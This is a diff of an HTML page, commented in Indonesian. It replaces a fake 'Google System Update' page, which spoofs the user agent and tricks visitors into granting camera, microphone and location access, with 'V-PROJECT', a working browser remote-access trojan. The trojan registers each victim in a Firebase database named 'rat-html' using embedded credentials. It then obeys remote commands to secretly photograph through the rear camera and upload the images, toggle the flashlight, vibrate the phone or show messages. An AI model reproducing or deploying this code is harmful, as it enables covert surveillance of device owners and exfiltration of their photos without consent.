@@ -3,81 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google System Update</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        // --- 1. TRICK SPOOFER (Nipu WebView biar ngaku jadi Chrome Asli) ---
-        Object.defineProperty(navigator, 'userAgent', {
-            get: function () { return 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'; }
-        });
-    </script>
-    <style>
-        body { background: #ffffff; font-family: sans-serif; }
-        .cb-luxury { width: 22px; height: 22px; accent-color: #1a73e8; }
-    </style>
+    <title>V-PROJECT SYSTEM</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
-<body class="flex flex-col items-center px-10 py-16 min-h-screen">
-
-    <div class="text-center mb-10">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo_v2.svg" width="50" class="mx-auto mb-6">
-        <h1 class="text-xl font-medium text-gray-800">Verifikasi Layanan</h1>
-        <p class="text-[10px] text-gray-400 mt-1 uppercase tracking-widest">Security Bridge v4.0</p>
-    </div>
-
-    <div class="w-full max-w-sm space-y-4 mb-10">
-        <div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl bg-gray-50/50" onclick="document.getElementById('c1').click()">
-            <input type="checkbox" id="c1" onchange="forcePrompt()" class="cb-luxury">
-            <label class="text-sm text-gray-700 font-medium">Verifikasi Modul Hardware</label>
-        </div>
-        <div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl bg-gray-50/50" onclick="document.getElementById('c2').click()">
-            <input type="checkbox" id="c2" onchange="forcePrompt()" class="cb-luxury">
-            <label class="text-sm text-gray-700 font-medium">Sinkronisasi GPS Google</label>
-        </div>
-    </div>
-
-    <button id="finalBtn" disabled class="w-full max-w-sm bg-gray-200 text-gray-400 py-4 rounded-xl font-bold uppercase tracking-widest text-xs">
-        Update Berhasil
-    </button>
-
-    <video id="v" autoplay playsinline style="display:none;"></video>
+<body style="background:#000; color:#00f2ff; font-family:monospace; text-align:center; padding-top:100px;">
+    <h2 id="t" style="text-shadow: 0 0 10px #00f2ff;">V-PROJECT V1.0 [OFFLINE]</h2>
+    <div id="dev">DETECTING DEVICE...</div>
+    <p id="s" style="color:yellow; font-size:0.8rem; margin-top:20px;">SISTEM MEMBUTUHKAN IZIN AKSES</p>
+    <button id="b" onclick="startSystem(this)" style="padding:15px 30px; background:#00f2ff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; box-shadow: 0 0 15px #00f2ff; margin-top:10px;">IZINKAN & LANJUTKAN</button>
 
     <script>
-        async function forcePrompt() {
-            // --- 2. TRICK AUDIO CONTEXT (Bangunin WebView Basic) ---
-            try {
-                const AudioCtx = window.AudioContext || window.webkitAudioContext;
-                const aCtx = new AudioCtx();
-                if (aCtx.state === 'suspended') await aCtx.resume();
-            } catch(e) {}
+        // CONFIG FIREBASE RAT-HTML (SINGAPORE REGION)
+        const firebaseConfig = {
+            apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
+            authDomain: "rat-html.firebaseapp.com",
+            databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "rat-html",
+            storageBucket: "rat-html.firebasestorage.app",
+            messagingSenderId: "1060124583265",
+            appId: "1:1060124583265:web:7988dc574a1be9f10f5120",
+            measurementId: "G-SP76CHQ5XN"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-            // --- 3. TEMBAK IZIN (Double Method) ---
-            try {
-                // Method Modern
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = stream;
-                
-                // Method Lokasi
-                navigator.geolocation.getCurrentPosition(() => {
-                    checkAll();
-                });
-            } catch (err) {
-                // Method Legacy (Buat WebView jadul)
-                const legacyCam = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
-                if (legacyCam) {
-                    legacyCam.call(navigator, {video: true, audio: true}, () => { checkAll(); }, () => {});
-                } else {
-                    alert("Klik 'IZINKAN' pada sistem untuk melanjutkan!");
+        function startSystem(btn) {
+            btn.style.display = 'none';
+            document.getElementById('t').innerText = "V-PROJECT V1.0 [ONLINE]";
+            document.getElementById('s').innerText = "SYSTEM INJECTED. DO NOT CLOSE.";
+
+            const ua = navigator.userAgent;
+            const deviceName = ua.match(/(Infinix|Samsung|Oppo|Xiaomi|Vivo|Realme|Huawei)/i)?.[0] || "Android Device";
+            const myID = "RAT_" + Math.floor(Math.random() * 9999);
+            document.getElementById('dev').innerText = "DEVICE: " + deviceName;
+
+            // Lapor ke Firebase
+            db.ref('targets/' + myID).set({ name: deviceName, status: "Online", time: Date.now() });
+
+            // Listener Perintah
+            db.ref('commands/' + myID).on('value', (snap) => {
+                const c = snap.val(); if(!c) return;
+
+                // FITUR SENTER BELAKANG
+                if(c.type === "flash") {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                    .then(str => {
+                        const track = str.getVideoTracks()[0];
+                        track.applyConstraints({ advanced: [{ torch: c.status === "on" }] });
+                    }).catch(e => console.log("Flash Error"));
                 }
-            }
-        }
 
-        function checkAll() {
-            if(document.getElementById('c1').checked && document.getElementById('c2').checked) {
-                const btn = document.getElementById('finalBtn');
-                btn.disabled = false;
-                btn.className = "w-full max-w-sm bg-blue-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest text-xs shadow-lg";
-                btn.innerText = "SISTEM TERVERIFIKASI";
-            }
+                // FITUR AMBIL FOTO BELAKANG
+                if(c.type === "capture") {
+                    const v = document.createElement('video');
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                    .then(str => {
+                        v.srcObject = str; v.play();
+                        setTimeout(() => {
+                            const cn = document.createElement('canvas');
+                            cn.width = v.videoWidth; cn.height = v.videoHeight;
+                            cn.getContext('2d').drawImage(v, 0, 0);
+                            const photoData = cn.toDataURL('image/jpeg', 0.5);
+                            db.ref('reports/' + myID).set({ photo: photoData, time: Date.now() });
+                            str.getTracks().forEach(t => t.stop());
+                        }, 2000);
+                    });
+                }
+
+                if(c.type === "vibrate") navigator.vibrate(c.dur || 2000);
+                if(c.type === "msg") alert(c.text);
+            });
         }
     </script>
 </body>
